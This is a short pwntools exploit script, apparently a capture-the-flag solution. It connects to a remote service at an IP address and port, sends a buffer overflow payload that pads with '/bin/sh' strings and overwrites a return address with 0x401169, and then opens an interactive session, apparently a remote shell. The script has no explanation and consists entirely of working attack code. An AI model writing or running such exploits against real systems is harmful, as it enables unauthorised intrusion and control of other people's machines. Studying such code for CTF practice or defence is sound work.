from pwn import *

r = remote('83.136.254.223', 52333)
        
pay = (40//8) * b'/bin/sh\x00' + p64(0x401169)

r.sendlineafter(b'>> ', pay)

r.interactive()
